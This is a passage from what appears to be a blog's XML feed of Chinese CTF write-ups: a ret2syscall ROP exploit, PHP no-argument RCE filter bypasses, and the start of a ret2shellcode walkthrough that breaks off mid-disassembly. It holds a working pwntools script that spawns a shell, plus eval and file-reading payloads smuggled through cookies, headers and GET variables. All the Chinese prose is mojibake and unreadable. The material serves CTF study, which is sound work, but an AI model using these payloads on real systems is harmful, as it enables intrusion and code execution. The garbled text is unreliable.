alt></p><p>æ°å¥½ä¹Ÿæœ‰æˆ‘ä»¬æ‰€éœ€è¦çš„ï¼Œåªä¸è¿‡é¡ºåºå’Œæˆ‘ä»¬çš„ä¸åŒï¼Œåœ¨ç»„ç»‡payloadæ—¶å€™éœ€è¦è°ƒæ¢ä¸‹é¡ºåºã€‚</p><p>æˆ‘ä»¬åœ¨æ‰¾ä¸€ä¸‹å­—ç¬¦ä¸²â€œ/bin/shâ€çš„åœ°å€</p><p>ROPgadget â€“binary ./ret2syscall â€“string â€œ/bin/shâ€</p><p><img src="/2020/03/20/ROP-Ret2Syscall%E5%8E%9F%E7%90%86%E5%8F%8A%E5%BA%94%E7%94%A8/image-20200121230506453.png" alt></p><p>åœ°å€ä¸º0x080be408</p><p>æˆ‘ä»¬åœ¨æŸ¥æ‰¾ä¸‹â€œint 0x80â€çš„åœ°å€</p><p>ROPgadget â€“binary ./ret2syscall â€“only â€œintâ€</p><p><img src="/2020/03/20/ROP-Ret2Syscall%E5%8E%9F%E7%90%86%E5%8F%8A%E5%BA%94%E7%94%A8/image-20200121230556764.png" alt></p><p>åœ°å€ä¸º0x08049421</p><p>æ‰€ä»¥æˆ‘ä»¬ç°åœ¨æœ‰äº†æ‰€æœ‰æˆ‘ä»¬éœ€è¦çš„å†…å®¹äº†ï¼Œæ¥ä¸‹æ¥å†™payloadã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">sh &#x3D; process(&#39;.&#x2F;ret2syscall&#39;)</span><br><span class="line">pop_eax_ret &#x3D; 0x080bb196</span><br><span class="line">pop_edx_ecx_ebx_ret &#x3D; 0x0806eb90</span><br><span class="line">int_0x80 &#x3D; 0x08049421</span><br><span class="line">binsh &#x3D; 0x80be408</span><br><span class="line">payload &#x3D; &#39;A&#39; * 112 + p32(pop_eax_ret) +p32(0xb)+p32(pop_edx_ecx_ebx_ret)+ p32(0)+p32(0)+p32(binsh)+p32(int_0x80)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p>è°ƒè¯•ç¨‹åºå‚è€ƒï¼š<a href="https://blog.51cto.com/11797152/2379740?source=dra" target="_blank" rel="noopener">https://blog.51cto.com/11797152/2379740?source=dra</a></p>]]></content>
      
      
      <categories>
          
          <category> pwnåŸºç¡€çŸ¥è¯† </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> ROP-Ret2SyscallåŸç† </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>phpæ— å‚æ•°RCE</title>
      <link href="/2020/03/20/php%E6%97%A0%E5%8F%82%E6%95%B0RCE/"/>
      <url>/2020/03/20/php%E6%97%A0%E5%8F%82%E6%95%B0RCE/</url>
      
        <content type="html"><![CDATA[<h3 id="0x-01-æºä»£ç åˆ†æ"><a href="#0x-01-æºä»£ç åˆ†æ" class="headerlink" title="0x 01 æºä»£ç åˆ†æ"></a>0x 01 æºä»£ç åˆ†æ</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if(&#39;;&#39; &#x3D;&#x3D;&#x3D; preg_replace(&#39;&#x2F;[^\W]+\((?R)?\)&#x2F;&#39;, &#39;&#39;, $_GET[&#39;code&#39;])) &#123;    </span><br><span class="line">    eval($_GET[&#39;code&#39;]);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    show_source(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">preg_replace çš„ä¸»è¦åŠŸèƒ½å°±æ˜¯é™åˆ¶æˆ‘ä»¬ä¼ è¾“è¿›æ¥çš„å¿…é¡»æ—¶çº¯å°å†™å­—æ¯çš„å‡½æ•°ï¼Œè€Œä¸”ä¸èƒ½æºå¸¦å‚æ•°ï¼Œä¾‹å¦‚print_r(&quot;123&quot;);è¿™ç§çš„ï¼Œæ˜¯ä¸å…è®¸è¿›è¡Œä¼ å…¥çš„</span><br><span class="line">preg_matchçš„ä¸»è¦åŠŸèƒ½å°±æ˜¯è¿‡æ»¤å‡½æ•°ï¼ŒæŠŠä¸€äº›å¸¸ç”¨ä¸å¸¦å‚æ•°çš„å‡½æ•°å…³é”®éƒ¨åˆ†éƒ½ç»™è¿‡æ»¤äº†ï¼Œéœ€è¦å»æ„é€ åˆ«çš„æ–¹æ³•å»æ‰§è¡Œå‘½ä»¤ã€‚</span><br></pre></td></tr></table></figure><h3 id="0x-02-è§£é¢˜æ–¹æ³•"><a href="#0x-02-è§£é¢˜æ–¹æ³•" class="headerlink" title="0x 02 è§£é¢˜æ–¹æ³•"></a>0x 02 è§£é¢˜æ–¹æ³•</h3><ul><li>http-headerä¼ å‚</li></ul><p>åœ¨session_idä¸­è®¾ç½®æˆ‘ä»¬æƒ³è¦è¾“å…¥çš„RCEï¼Œè¾¾åˆ°ä¼ å‚çš„ç›®çš„ï¼Œä½†æ˜¯ç¬¬ä¸€ç‚¹éœ€è¦session_start()å¼€å¯sessionä¼šè¯ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">payloadï¼šcode&#x3D;eval(hex2bin(session_id(session_start())));</span><br><span class="line">Cookie: PHPSESSID&#x3D;706870696e666f28293b</span><br><span class="line"></span><br><span class="line">### hex(&quot;phpinfo();&quot;)&#x3D;706870696e666f28293b</span><br></pre></td></tr></table></figure><p><img src="/2020/03/20/php%E6%97%A0%E5%8F%82%E6%95%B0RCE/image-20200206195207981.png" alt></p><ul><li><p>post/getä¼ å…¥å‚æ•°</p><p>get_defined_vars()å‡½æ•°</p></li></ul><p>get_defined_vars ( void ) : array è¿”å›ç”±æ‰€æœ‰å·²å®šä¹‰å˜é‡æ‰€ç»„æˆçš„æ•°ç»„<br> æ­¤å‡½æ•°è¿”å›ä¸€ä¸ªåŒ…å«æ‰€æœ‰å·²å®šä¹‰å˜é‡åˆ—è¡¨çš„å¤šç»´æ•°ç»„ï¼Œè¿™äº›å˜é‡åŒ…æ‹¬ç¯å¢ƒå˜é‡ã€æœåŠ¡å™¨å˜é‡å’Œç”¨æˆ·å®šä¹‰çš„å˜é‡ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload:?code&#x3D;eval(end(current(get_defined_vars())));&amp;b&#x3D;phpinfo();</span><br></pre></td></tr></table></figure><p><img src="/2020/03/20/php%E6%97%A0%E5%8F%82%E6%95%B0RCE/image-20200206195944964.png" alt></p><p>â€‹    getallheaders()å‡½æ•°</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">paylaod:?code&#x3D;eval(end(getallheaders()));</span><br><span class="line">lxj: phpinfo();</span><br></pre></td></tr></table></figure><p><img src="/2020/03/20/php%E6%97%A0%E5%8F%82%E6%95%B0RCE/image-20200206200741938.png" alt></p><p>ä»»æ„æ–‡ä»¶è¯»å–ï¼šdirname() &amp; chdir()</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">å½“å‰ç›®å½•çš„ç›®å½•éå†:?code&#x3D;var_dump(scandir(getcwd()));</span><br><span class="line">ç›®å½•ä¸Šè·³éå†ï¼š?code&#x3D;var_dump(scandir(dirname(getcwd())));ã€</span><br><span class="line">ä¿®æ”¹ç›®å½•ï¼šchdir(dirname(getcwd()))</span><br><span class="line">å…·ä½“å‚è€ƒï¼šhttps:&#x2F;&#x2F;skysec.top&#x2F;2019&#x2F;03&#x2F;29&#x2F;PHP-Parametric-Function-RCE&#x2F;#%E6%B3%95%E4%BA%94%EF%BC%9Adirname-amp-chdir</span><br></pre></td></tr></table></figure><h3 id="0x-03-ä¾‹é¢˜åˆ†æ"><a href="#0x-03-ä¾‹é¢˜åˆ†æ" class="headerlink" title="0x 03 ä¾‹é¢˜åˆ†æ"></a>0x 03 ä¾‹é¢˜åˆ†æ</h3><h4 id="3-1-ByteCTF-Boringcode"><a href="#3-1-ByteCTF-Boringcode" class="headerlink" title="3.1 ByteCTF Boringcode"></a>3.1 ByteCTF Boringcode</h4><p>åŸé¢˜éƒ¨åˆ†ä»£ç </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">$code &#x3D; file_get_contents($url);</span><br><span class="line">            if (&#39;;&#39; &#x3D;&#x3D;&#x3D; preg_replace(&#39;&#x2F;[a-z]+\((?R)?\)&#x2F;&#39;, NULL, $code)) &#123;</span><br><span class="line">                if (preg_match(&#39;&#x2F;et|na|nt|strlen|info|path|rand|dec|bin|hex|oct|pi|exp|log&#x2F;i&#39;, $code)) &#123;</span><br><span class="line">                    echo &#39;bye~&#39;;</span><br><span class="line">                &#125; else &#123;</span><br><span class="line">                    eval($code);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            echo &quot;error: host not allowed&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        echo &quot;error: invalid url&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é¢˜åŠ å¤§äº†å¾ˆå¤šéš¾åº¦ï¼Œè¿‡æ»¤äº†è¿™ä¹ˆäº›ä¸œè¥¿ <code>/et|na|nt|strlen|info|path|rand|dec|bin|hex|oct|pi|exp|log/</code></p><p>é¦–å…ˆåˆ©ç”¨readfile(end(scandir(â€œ.â€))) # </p><p>å¯ä»¥æˆåŠŸè¯»å–å½“å‰ç›®å½•ä¸‹çš„æœ€åä¸€ä¸ªæ–‡ä»¶çš„ï¼Œä¸‹ä¸€æ­¥å°±æ˜¯ç»•è¿‡â€.â€</p><p>è¿™é‡Œåˆ©ç”¨äº†localeconv()å‡½æ•°ï¼Œå‡½æ•°è¿”å›çš„æ•°ç»„ç¬¬ä¸€ä½æ­£æ˜¯æˆ‘ä»¬éœ€è¦çš„â€œ.â€å‡½æ•°ï¼Œå°è¯•æ„é€ ä¸€ä¸‹</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">readfile(end(scandir(reset(localeconv()))));</span><br></pre></td></tr></table></figure><p>å¯ä»¥æˆåŠŸè¯»å–å½“å‰ç›®å½•ä¸‹çš„æœ€åä¸€ä¸ªæ–‡ä»¶,å…¶ä»–æ„é€ ç‚¹çš„payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chr(pos(localtime(time(chdir(next(scandir(pos(localeconv())))))))) #46</span><br><span class="line">chr(ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion())))))))) #46</span><br></pre></td></tr></table></figure><p>å‚è€ƒpayloadï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">if(chdir(next(scandir(pos(localeconv())))))readfile(end(scandir(pos(localeconv()))));</span><br><span class="line"># next(scandir(pos(localeconv()))) è¿”å›å­—ç¬¦ä¸²&#39;..&#39;å³å½“å‰ç›®å½•çš„ä¸Šä¸€çº§ç›®å½•</span><br><span class="line"># ä½¿ç”¨chdir()å‡½æ•°ï¼Œæ›´æ”¹ç›®å½•ï¼Œè¿”å›1çš„åŒæ—¶ï¼Œè¯»å–ç›®å½•ä¸‹çš„æ–‡ä»¶</span><br><span class="line"></span><br><span class="line">echo(readfile(end(scandir(chr(pos(localtime(time(chdir(next(scandir(pos(localeconv()))))))))))));</span><br><span class="line"># é€šè¿‡chdirä¿®æ”¹å½“å‰ç›®å½•ï¼Œé€šè¿‡localtime()ç­‰å‡½æ•°æ„é€ chrï¼ˆ46ï¼‰å³â€œ.â€è¾¾åˆ°è¯»å–ä¸Šå±‚ç›®å½•æ–‡ä»¶çš„ç›®çš„</span><br></pre></td></tr></table></figure><p>å®˜æ–¹WPï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo(readfile(end(scandir(chr(pos(localtime(time(chdir(next(scandir(chr(ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion())))))))))))))))))));</span><br></pre></td></tr></table></figure><h4 id="3-2-2019ä¸Šæµ·å¸‚å¤§å­¦ç”Ÿç½‘ç»œå®‰å…¨å¤§èµ›-decade"><a href="#3-2-2019ä¸Šæµ·å¸‚å¤§å­¦ç”Ÿç½‘ç»œå®‰å…¨å¤§èµ›-decade" class="headerlink" title="3.2 2019ä¸Šæµ·å¸‚å¤§å­¦ç”Ÿç½‘ç»œå®‰å…¨å¤§èµ›_decade"></a>3.2 2019ä¸Šæµ·å¸‚å¤§å­¦ç”Ÿç½‘ç»œå®‰å…¨å¤§èµ›_decade</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">$code &#x3D; $_GET[&#39;code&#39;];</span><br><span class="line">if (!empty($code)) &#123;</span><br><span class="line">        if (&#39;;&#39; &#x3D;&#x3D;&#x3D; preg_replace(&#39;&#x2F;[a-z]+\((?R)?\)&#x2F;&#39;, NULL, $code)) &#123;</span><br><span class="line">        if (preg_match(&#39;&#x2F;readfile|if|time|local|sqrt|et|na|nt|strlen|info|path|rand|dec|bin|hex|oct|pi|exp|log&#x2F;i&#39;, $code)) &#123;</span><br><span class="line">            echo &#39;bye~&#39;;</span><br><span class="line">                &#125; else &#123;</span><br><span class="line">                    eval($code);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        else &#123;</span><br><span class="line">            echo &quot;invalid&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;else &#123;</span><br><span class="line">        echo &quot;invalid&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>ç›¸æ¯”Byteå‘ç°ä¸Byteçš„é¢˜ç›®å¾ˆç›¸ä¼¼ï¼Œä¸åŒçš„å°±æ˜¯æ­£åˆ™è¿‡æ»¤çš„æ›´å¤šäº†ï¼Œæˆ‘ä»¬å°±ä¸èƒ½ä½¿ç”¨readfileç­‰æ–¹å¼å»è¯»æ–‡ä»¶äº†ï¼Œä¹Ÿä¸èƒ½ç”¨timeçš„æ–¹å¼å»è·å–â€œ.â€äº†ã€‚é¦–å…ˆè¿˜æ˜¯fuzzä¸€ä¸‹ï¼Œphpä¸­ç±»ä¼¼readfileçš„å‡½æ•°</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?</span><br><span class="line">var_dump(gettype(get_defined_functions()));</span><br><span class="line">var_dump(count(get_defined_functions()[internal]));</span><br><span class="line">&#x2F;&#x2F; var_dump(preg_match(&#39;&#x2F;et|na|nt|strlen|info|path|rand|dec|bin|hex|oct|pi|exp|log&#x2F;i&#39;, &#39;111&#39;));</span><br><span class="line"> </span><br><span class="line">$i_need_func&#x3D;array();</span><br><span class="line">$j&#x3D;0;</span><br><span class="line">for ($i&#x3D;0; $i &lt; count(get_defined_functions()[internal]) ; $i++) &#123;</span><br><span class="line">    if (!preg_match(&#39;&#x2F;et|na|nt|strlen|info|path|rand|dec|bin|hex|oct|pi|exp|log|xdebug|prvd|_|-&#x2F;i&#39;, get_defined_functions()[internal][$i])) &#123;</span><br><span class="line">        $i_need_func[$j]&#x3D;get_defined_functions()[internal][$i];</span><br><span class="line">        $j++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">print_r($i_need_func);</span><br></pre></td></tr></table></figure><p>å‘ç°readgzfileè¿™ä¸ªå‡½æ•°ï¼Œçœ‹ä¸€ä¸‹å‡½æ•°çš„å®šä¹‰ï¼Œä¸»è¦æ˜¯è¯»å–ä¸€ä¸ªå‹ç¼©æ–‡ä»¶ï¼Œä¸è¿‡åœ¨æœ¬åœ°æµ‹è¯•æ—¶å‘ç°ï¼Œè¯¥å‡½æ•°ä¹Ÿå¯ä»¥å®ç°readfileçš„åŠŸèƒ½å»è¯»å–æ–‡ä»¶ã€‚</p><p>å­—èŠ‚è·³åŠ¨åŸpayload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">readfile(end(scandir(chr(pos(localtime(time(chdir(next(scandir(chr(ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion()))))))))))))))))));</span><br></pre></td></tr></table></figure><p>å°†readfileä¿®æ”¹ä¸ºreadgzfile,è¿™é‡Œä¸å†ä½¿ç”¨time()å‡½æ•°ï¼Œä½¿ç”¨ord()ã€hebrevc()ç­‰å‡½æ•°æ„é€ ,åœ¨7.0çš„phpç¯å¢ƒä¸‹ï¼š</p><p>é¦–å…ˆå°è¯•è¯»å–å½“å‰ç›®å½•ä¸‹çš„æ–‡ä»¶ï¼Œä»ç„¶æ˜¯æ„é€ â€œ.â€ï¼ŒåŸæ¥æ„é€ çš„paylodï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">readfile(end(scandir(reset(localeconv()))));</span><br></pre></td></tr></table></figure><p>å› ä¸ºé¢˜ç›®ä¸­æ­£åˆ™å°†â€œlocalâ€ç»™è¿‡æ»¤äº†ï¼Œæ‰€ä»¥è¦æ¢ç§æ–¹æ³•å»æ„é€ ï¼Œæœ¬åœ°å°è¯•æ„é€ ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">readfile(end(scandir(chr(ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion())))))))))));</span><br></pre></td></tr></table></figure><p>ä½†å› ä¸ºsqrtå‡½æ•°è¢«è¿‡æ»¤ï¼Œç»§ç»­æ„é€ </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(ord(hebrevc(crypt(phpversion()))));</span><br></pre></td></tr></table></figure><p>cryptæ¯æ¬¡åŠ å¯†éƒ½æ˜¯éšæœºçš„ï¼Œä¿®æ”¹payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print_r(scandir(chr(ord(hebrevc(crypt(chdir(next(scandir(chr(ord(hebrevc(crypt(phpversion())))))))))))));</span><br></pre></td></tr></table></figure><p>è¯»å–æ–‡ä»¶</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">readgzfile(end(scandir(chr(ord(hebrevc(crypt(chdir(next(scandir(chr(ord(hebrevc(crypt(phpversion()))))))))))))));</span><br></pre></td></tr></table></figure><p>æå®¢å¤§æŒ‘æˆ˜ 2019</p><p><img src="http://static.zybuluo.com/Pdsdt/el86boz75xe4eu21dt8p9ois/image.png" alt="image.png-130.7kB"></p><p>è¯¥å‡½æ•°ä¼šè·å–æˆ‘ä»¬ä¼ è¾“ä¸­headersçš„æ‰€æœ‰ä¿¡æ¯å¹¶ä»¥æ•°ç»„å½¢å¼è¾“å‡ºï¼Œæˆ‘ä»¬å¯ä»¥å°†æ¶æ„ä»£ç å†™åœ¨ä¼ è¾“çš„headerså¤´ä¸­ï¼Œå†ä½¿ç”¨è¯¥å‡½æ•°è¿›è¡ŒåŒ…å«æ‰§è¡Œï¼Œè¿™æ ·å°±å¯ä»¥è¾¾åˆ°æˆ‘ä»¬ç»•è¿‡æ£€æµ‹å‘½ä»¤æ‰§è¡Œçš„ç›®çš„</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#headers : readfile(&quot;theflag.php&quot;);</span><br><span class="line"></span><br><span class="line">eval(end(getallheaders()));</span><br></pre></td></tr></table></figure><blockquote><p><a href="https://www.cnblogs.com/sylover/p/11863778.html" target="_blank" rel="noopener">https://www.cnblogs.com/sylover/p/11863778.html</a></p><p><a href="https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/" target="_blank" rel="noopener">https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/</a></p><p><a href="http://www.pdsdt.lovepdsdt.com/index.php/2019/11/06/php_shell_no_code/" target="_blank" rel="noopener">http://www.pdsdt.lovepdsdt.com/index.php/2019/11/06/php_shell_no_code/</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> tricks </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> phpæ— å‚æ•°RCE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Ret2ShellcodeåŸç†åŠåº”ç”¨</title>
      <link href="/2020/03/20/Ret2Shellcode%E5%8E%9F%E7%90%86%E5%8F%8A%E5%BA%94%E7%94%A8/"/>
      <url>/2020/03/20/Ret2Shellcode%E5%8E%9F%E7%90%86%E5%8F%8A%E5%BA%94%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h3 id="0x-01-Ret2ShellcodeåŸç†"><a href="#0x-01-Ret2ShellcodeåŸç†" class="headerlink" title="0x 01 Ret2ShellcodeåŸç†"></a>0x 01 Ret2ShellcodeåŸç†</h3><ul><li><p>shellcode æŒ‡çš„æ˜¯ç”¨äºå®ŒæˆæŸä¸ªåŠŸèƒ½çš„æ±‡ç¼–ä»£ç ï¼Œå¸¸è§çš„åŠŸèƒ½ä¸»è¦æ˜¯è·å–ç›®æ ‡ç³»ç»Ÿçš„ shell</p></li><li><p>Shellcodeè·å–çš„ä¸¤ç§æ–¹å¼ï¼šè‡ªå·±æ”¶é›†å’Œpwntoolsè‡ªå¸¦</p></li><li><p>åœ¨æ ˆæº¢å‡ºçš„åŸºç¡€ä¸Šï¼Œè¦æƒ³æ‰§è¡Œ shellcodeï¼Œéœ€è¦å¯¹åº”çš„ binary åœ¨è¿è¡Œæ—¶ï¼Œshellcode æ‰€åœ¨çš„åŒºåŸŸå…·æœ‰å¯æ‰§è¡Œæƒé™ã€‚</p></li><li><p>ç¤ºæ„å›¾</p><p>å…ˆå†™å…¥å…·æœ‰æ”»å‡»æ€§çš„æ±‡ç¼–ç‰‡æ®µï¼ˆshellcodeï¼‰åˆ°æ ˆä¸­ï¼Œç„¶ååŠ«æŒç¨‹åºè·³è½¬åˆ°shellcodeçš„å…¥å£å¤„æ‰§è¡Œ</p></li></ul><p><img src="/2020/03/20/Ret2Shellcode%E5%8E%9F%E7%90%86%E5%8F%8A%E5%BA%94%E7%94%A8/image-20200120172248877.png" alt></p><h3 id="0x-02-å®ä¾‹åˆ†æ"><a href="#0x-02-å®ä¾‹åˆ†æ" class="headerlink" title="0x 02 å®ä¾‹åˆ†æ"></a>0x 02 å®ä¾‹åˆ†æ</h3><p>mainå‡½æ•°ä¼ªä»£ç </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  char s; &#x2F;&#x2F; [esp+1Ch] [ebp-64h]</span><br><span class="line"></span><br><span class="line">  setvbuf(stdout, 0, 2, 0);</span><br><span class="line">  setvbuf(stdin, 0, 1, 0);  &#x2F;&#x2F;setvbufç”¨äºå†…å­˜ä¼˜åŒ–</span><br><span class="line">  puts(&quot;No system for you this time !!!&quot;);</span><br><span class="line">  gets(&amp;s);</span><br><span class="line">  strncpy(buf2, &amp;s, 0x64u);</span><br><span class="line">  printf(&quot;bye bye ~&quot;);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>mainå‡½æ•°æ±‡ç¼–</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">0x0804852d &lt;+0&gt;:push   ebp</span><br><span class="line">0x0804852e &lt;+1&gt;:mov    ebp,esp</span><br><span class="line">0x08048530 &lt;+3&gt;:and    esp,0xfffffff0</span><br><span class="line">0x08048533 &lt;+6&gt;:add    esp,0xffffff80</span><br><span class="line">0x08048536 &lt;+9&gt;:mov    eax,ds:0x804a060</span><br><span class="line">0x0804853b &lt;+14&gt;:mov    DWORD PTR [esp+0xc],0x0</span><br><span class="line">0x08048543 &lt;+22&gt;:mov    DWORD PTR [esp+0x8],0x2</span><br><span class="line">0x0804854b &lt;+30&gt;:mov    DWORD PTR [esp+0x4],0x0</span><br><span class="line">0x08048553 &lt;+38&gt;:mov    DWORD PTR [esp],eax</span><br><span class="line">0x08048556 &lt;+41&gt;:call   0x8048410 &lt;setvbuf@plt&gt;</span><br><span class="line">0x0804855b &lt;+46&gt;:mov    eax,ds:0x804a040</span><br><span class="line">0x08048560 &lt;+51&gt;:mov    DWORD PTR [esp+0xc],0x0</span><br><span class="line">0x08048568 &lt;+59&gt;:mov    DWORD PTR [esp+0x8],0x1</span><br><span class="line">0x08048570 &lt;+67&gt;:mov    DWORD PTR [esp+0x4],0x0</span><br><span class="line">0x08048578 &lt;+75&gt;:mov    DWORD PTR [esp],eax</span><br><span class="line">0x0804857b &lt;+78&gt;:call   0x8048410 &lt;setvbuf@plt&gt;</span><br><span class="line">0x08048580 &lt;+83&gt;:mov    DWORD PTR [esp],0x8048660</span><br><span class="line">0x08048587 &lt;+90&gt;:call   0x80483e0 &lt;puts@plt&gt;</span><br><span class="line">0x0804858c &lt;+95&gt;:lea    eax,[esp+0x1c]</span><br><span class="line">0x08048590 &lt;+99&gt;:mov    DWORD PTR [esp],eax</span><br><span class="line">0x08048593 &lt;+102&gt;:call   0x80483d0 &lt;gets@plt&gt;</span><br><span class="line">0x08048598 &lt;+107&gt;:mov    DWORD PTR [esp+0x8],0x64</span><br><span class="line">0x080485a0 &lt;+115&gt;:lea    eax,[esp+0x1c]</span><br><span class="line">0x080485a4 &lt;+119&gt;:mov    DWORD PTR [esp+0x4],eax</span><br><span class="line">0x080485a8 &lt;+123&gt;:mov    DWORD PTR [esp],0x804a080</span><br><span class="line">0x080485af &lt;+130&gt;:call   0x8048420 &lt;strncpy@plt&gt;</span><br><span class="line">0x080485b4 &lt;+135&gt;:mov    DWORD PTR [esp],0x8048680</span><br><span class="line">0x080485bb &lt;+142&gt;:call   0x80483c0 &lt;printf@plt&gt;</span><br><span class="line">0x080485c0 &lt;+147&gt;:mov    eax,0x0</span><br><span class="line">0x080485c5 &lt;+152&gt;:leave  </span><br><span class="line">0x080485c6 